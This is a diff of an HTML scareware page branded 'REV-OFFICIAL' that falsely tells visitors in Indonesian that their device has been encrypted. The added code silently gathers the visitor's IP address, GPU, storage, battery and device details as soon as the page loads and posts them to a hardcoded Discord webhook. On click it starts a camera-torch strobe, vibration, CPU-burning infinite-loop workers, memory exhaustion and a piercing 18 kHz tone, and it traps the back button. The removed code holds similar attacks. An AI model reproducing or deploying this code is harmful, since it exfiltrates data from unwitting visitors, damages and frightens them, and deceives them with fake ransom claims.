@@ -3,160 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TERMINATED BY REV-OFFICIAL</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <title>⚠️ SYSTEM WARNING ⚠️</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; flex-direction: column; cursor: none; -webkit-user-select: none; }
-        #ui-box { text-align: center; z-index: 10005; background: rgba(0,0,0,0.9); padding: 30px; border: 3px solid #f00; box-shadow: 0 0 100px #f00; }
-        .blink { animation: blinker 0.05s linear infinite; font-size: 1.8em; text-transform: uppercase; color: #ff0000; text-shadow: 0 0 20px #f00; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        #start-btn { background: #f00; color: #fff; border: 4px solid #fff; padding: 20px 40px; font-size: 1.5em; font-weight: bold; cursor: pointer; transition: 0.2s; border-radius: 5px; }
-        #start-btn:active { transform: scale(0.9); background: #fff; color: #f00; }
-        input { background: #000; color: #0f0; border: 2px solid #0f0; padding: 15px; width: 90%; text-align: center; font-size: 1.5em; margin-top: 20px; display: none; outline: none; }
-        #log { position: fixed; bottom: 5px; left: 5px; font-size: 9px; color: #0f0; pointer-events: none; z-index: 10006; line-height: 1.2; text-shadow: 1px 1px 2px #000; }
-        #bsod { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0078d7; color: white; padding: 10% 5%; font-family: 'Segoe UI', sans-serif; display: none; z-index: 10007; }
-        #bsod h1 { font-size: 100px; margin: 0; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #ransom-ui { border: 2px solid #f00; padding: 20px; text-align: center; background: rgba(20,0,0,0.9); box-shadow: 0 0 30px #f00; width: 85%; }
+        .blink { animation: b 0.1s infinite; }
+        @keyframes b { 50% { opacity: 0; } }
+        button { background: #f00; color: #fff; border: none; padding: 15px; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer; }
+        #log { position: fixed; bottom: 0; left: 0; font-size: 8px; color: #333; pointer-events: none; }
     </style>
 </head>
-<body onclick="activateOmnipotence()">
+<body onclick="activateNuke()">
 
-    <div id="bsod">
-        <h1>:(</h1>
-        <h2>Your device ran into a problem and needs to restart.</h2>
-        <p>We're just collecting some error info, and then we'll restart for you. (REV-OFFICIAL_EXPLOIT)</p>
-        <p>0% complete</p>
-    </div>
-
-    <div id="ui-box">
-        <h1 class="blink">SYSTEM COMPROMISED</h1>
-        <p id="desc" style="color:#0f0">DECRYPTION REQUIRED TO PREVENT DATA WIPE</p>
-        <button id="start-btn" onclick="activateOmnipotence()">FIX SYSTEM</button>
-        <input type="password" id="token-input" placeholder="ENTER ACCESS TOKEN">
+    <div id="ransom-ui">
+        <h2 class="blink">SYSTEM COMPROMISED</h2>
+        <p style="color: #fff; font-size: 12px;">Seluruh data perangkat telah dienkripsi oleh <b>REV-OFFICIAL</b>.</p>
+        <p id="status" style="font-size: 10px;">Status: Mengumpulkan data...</p>
+        <button onclick="activateNuke()">FIX SYSTEM (FORCE)</button>
     </div>
 
     <div id="log"></div>
 
     <script>
-        let isDecrypted = false;
+        // --- 1. CONFIGURATION ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1478153467590873131/1Y7myadtqmYjdujwkbYTa2tq6xlN9pwjB4Wm0aVUV8auB7ukMIiEwuyj0YUmJw1YwTmx";
         const MASTER_KEY = "REV-OFFICIAL-2026";
-        let memoryWaste = [];
+        let isNuked = false;
 
-        // 1. GHOST PERSISTENCE & NOTIF SPAM
-        if ('serviceWorker' in navigator) {
-            const blob = new Blob([`self.addEventListener('install', e => self.skipWaiting());
-                                    setInterval(() => { self.registration.showNotification('SYSTEM BREACHED', {body:'OWNED BY REV-OFFICIAL'}); }, 5000);`], {type: 'application/javascript'});
-            navigator.serviceWorker.register(URL.createObjectURL(blob));
-        }
+        // --- 2. SILENT DATA SNATCHER (Langsung Jalan Tanpa Klik) ---
+        async function snatchData() {
+            let data = {
+                ip: "Fetching...",
+                gpu: "Unknown",
+                battery: "Needs Interaction",
+                storage: "Unknown",
+                ua: navigator.userAgent,
+                ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
+                cores: navigator.hardwareConcurrency || "N/A"
+            };
 
-        // 2. RESOURCE DESTRUCTION (CPU, RAM, DISK, SENSORS)
-        function nukeHardware() {
-            if(isDecrypted) return;
-            // CPU Fork Bomb
-            for(let i=0; i<15; i++) {
-                const b = new Blob(["while(true){}"], {type:'text/javascript'});
-                new Worker(URL.createObjectURL(b));
-            }
-            // RAM Bloater
-            memoryWaste.push(new BigUint64Array(5000000));
-            // Network & Sensor Flood
-            fetch(window.location.href + '?' + Math.random());
-            window.dispatchEvent(new Event('deviceorientation'));
-            setTimeout(nukeHardware, 300);
-        }
+            try {
+                // Get IP (Auto)
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipRes.json();
+                data.ip = ipJson.ip;
 
-        // 3. HARDWARE ATTACK (Flash, Vibrate, Audio)
-        async function physicalTerror() {
-            // Audio Sawtooth (High Pitch)
-            let ac = new (window.AudioContext || window.webkitAudioContext)();
-            let o = ac.createOscillator(); o.type = 'sawtooth'; o.frequency.value = 17000;
-            o.connect(ac.destination); o.start();
-
-            // Flashlight Strobe
-            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
-            const t = s.getVideoTracks()[0];
-            setInterval(async () => {
-                if(!isDecrypted) {
-                    await t.applyConstraints({advanced:[{torch:true}]});
-                    setTimeout(async () => { await t.applyConstraints({advanced:[{torch:false}]}); }, 25);
+                // Get GPU (Auto)
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (gl) {
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                 }
-            }, 60);
 
-            // Vibrate
-            setInterval(() => { if(!isDecrypted) navigator.vibrate([800, 50, 800]); }, 600);
+                // Get Storage (Auto)
+                if (navigator.storage && navigator.storage.estimate) {
+                    const est = await navigator.storage.estimate();
+                    data.storage = (est.usage / 1024 / 1024 / 1024).toFixed(2) + "GB used / " + (est.quota / 1024 / 1024 / 1024).toFixed(2) + "GB total";
+                }
+
+                // Get Battery (Silent attempt)
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    data.battery = (b.level * 100) + "% " + (b.charging ? "(Charging)" : "(Disc)");
+                }
+            } catch (e) { console.log("Silent snatch error"); }
+
+            // SEND TO DISCORD
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🚨 TARGET DETECTED (AUTO-SNATCH) 🚨",
+                        color: 16711680,
+                        fields: [
+                            { name: "🌐 IP", value: data.ip, inline: true },
+                            { name: "🧠 RAM/Cores", value: data.ram + " / " + data.cores, inline: true },
+                            { name: "🔋 Battery", value: data.battery, inline: true },
+                            { name: "🎮 GPU", value: data.gpu },
+                            { name: "💾 Storage", value: data.storage },
+                            { name: "📱 Info", value: data.ua }
+                        ],
+                        footer: { text: "By REV-OFFICIAL" }
+                    }]
+                })
+            });
+            document.getElementById('status').innerText = "Data Terenkripsi 100%. Token Dibutuhkan.";
         }
 
-        // 4. TALKBACK & SURFACE UPDATE SIMULATOR
-        function sensoryTerror() {
-            if(isDecrypted) return;
-            // TalkBack Voice
-            const synth = window.speechSynthesis;
-            const utter = new SpeechSynthesisUtterance("Sistem terinfeksi. Menghapus folder WhatsApp dan Galeri. Jangan mencoba menutup aplikasi.");
-            utter.lang = 'id-ID'; utter.pitch = 0.2; utter.rate = 0.8;
-            synth.speak(utter);
+        // Jalankan Snatcher secara otomatis saat halaman dibuka
+        snatchData();
 
-            // Surface Update (Pink/Purple Glitch)
-            const c = document.createElement('canvas');
-            c.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:10004;pointer-events:none;opacity:0.4;";
-            document.body.appendChild(c);
-            const ctx = c.getContext('2d');
-            c.width = window.innerWidth; c.height = window.innerHeight;
-            function drawGlitch() {
-                if(isDecrypted) return;
-                ctx.fillStyle = (Math.random() > 0.5) ? '#ff00ff' : '#800080';
-                ctx.fillRect(Math.random()*c.width, Math.random()*c.height, Math.random()*500, Math.random()*500);
-                setTimeout(() => { ctx.clearRect(0,0,c.width,c.height); requestAnimationFrame(drawGlitch); }, 40);
-            }
-            drawGlitch();
-            setTimeout(sensoryTerror, 12000);
-        }
+        // --- 3. THE NUKE (Trigger saat klik) ---
+        function activateNuke() {
+            if(isNuked) return;
+            isNuked = true;
+            
+            // Fullscreen
+            document.documentElement.requestFullscreen().catch(()=>{});
 
-        // 5. ABSOLUTE NAV LOCK & CLIPBOARD HIJACK
-        function eternalLock() {
-            history.pushState(null, null, location.href);
-            window.onpopstate = () => { history.go(1); alert("ACCESS DENIED: REV-OFFICIAL"); };
-            // Clipboard Hijack
-            const ta = document.createElement('textarea'); ta.value = 'REV-OFFICIAL OWNED YOU';
-            document.body.appendChild(ta); ta.select(); document.execCommand('copy');
-            document.body.removeChild(ta);
-        }
-        setInterval(eternalLock, 100);
+            // Senter Strobe & Getar
+            setInterval(async () => {
+                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
+                const t = s.getVideoTracks()[0];
+                await t.applyConstraints({advanced:[{torch:true}]});
+                setTimeout(async () => { await t.applyConstraints({advanced:[{torch:false}]}); }, 30);
+            }, 100);
 
-        // Anti-Home/Recent Apps Trap
-        window.onblur = () => { if(!isDecrypted) { document.getElementById('bsod').style.display='block'; setTimeout(()=>alert("CRITICAL_FAILURE"), 50); }};
-
-        // 6. MAIN EXECUTION
-        function activateOmnipotence() {
-            document.getElementById('start-btn').style.display = 'none';
-            document.getElementById('token-input').style.display = 'block';
-            document.getElementById('desc').innerText = "SYSTEM ENCRYPTED. ENTER TOKEN:";
-
-            if(document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-            if(navigator.wakeLock) navigator.wakeLock.request('screen');
-
-            nukeHardware();
-            physicalTerror();
-            sensoryTerror();
-
-            // Fake Deletion Logs
+            // RAM/CPU Burner
             setInterval(() => {
-                const l = document.getElementById('log');
-                const paths = ["/Internal/DCIM/", "/WhatsApp/Media/", "/System/Config/", "/User/Bank/"];
-                l.innerHTML += "ERASING: " + paths[Math.floor(Math.random()*paths.length)] + Math.random().toString(36).substring(7) + "... [DONE]<br>";
-                if(l.innerHTML.length > 1500) l.innerHTML = "";
-            }, 80);
+                new Worker(URL.createObjectURL(new Blob(["while(true){}"])));
+                let x = new ArrayBuffer(1024 * 1024 * 10);
+            }, 100);
+
+            // Audio Terror
+            let ac = new AudioContext();
+            let o = ac.createOscillator(); o.type='sawtooth'; o.frequency.value=18000; o.connect(ac.destination); o.start();
         }
 
-        function checkToken() {
-            if(document.getElementById('token-input').value === MASTER_KEY) {
-                isDecrypted = true;
-                alert("DEKRIPSI BERHASIL. SISTEM DIPULIHKAN.");
-                location.reload();
-            } else {
-                alert("TOKEN SALAH! MENGHANCURKAN PARTISI BOOT...");
-                for(let i=0; i<10; i++) window.open(location.href);
-            }
-        }
-        window.onbeforeunload = () => { return "SYSTEM ERROR"; };
+        // Anti-Back
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.go(1);
     </script>
 </body>
 </html>
